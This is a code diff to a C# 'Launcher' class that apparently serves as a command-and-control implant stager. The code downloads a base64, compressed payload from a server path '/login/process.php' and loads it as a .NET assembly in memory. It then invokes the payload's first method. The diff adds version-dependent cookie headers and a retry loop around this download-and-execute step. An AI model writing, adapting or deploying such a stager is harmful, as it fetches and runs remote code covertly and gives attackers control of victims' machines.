@@ -22,12 +22,24 @@ namespace Launcher
             string k = "";
             string ser = Encoding.Unicode.GetString(Convert.FromBase64String(""));
             string t = "/login/process.php";
-            wc.Headers.Add("Cookie", "");
-            byte[] data = wc.DownloadData(ser+t);
-            string decryptedAssembly = Encoding.ASCII.GetString(data);
-            Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
-            agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { ser,k,u });
+            string v = Environment.Version.Major.ToString();
+            if (v.Equals("2")){wc.Headers.Add("Cookie", "35");}
+            if (v.Equals("4")){wc.Headers.Add("Cookie", "45");}
+            while (System.Environment.UserDomainName.Equals(""))
+            {
+                try
+                {
+                    byte[] data = wc.DownloadData(ser+t);
+                    string decryptedAssembly = Encoding.ASCII.GetString(data);
+                    Assembly agentAssembly = Assembly.Load(Decompress(Convert.FromBase64String(decryptedAssembly)));
+                    agentAssembly.GetTypes()[0].GetMethods()[0].Invoke(null, new Object[] { ser,k,u });
+                    break;
+                }
+                catch(Exception ex){
+                    //ser=wc.DownloadString("").Trim();
+                }
 
+            }
         }
         private static byte[] Decompress(byte[] compressed)
         {
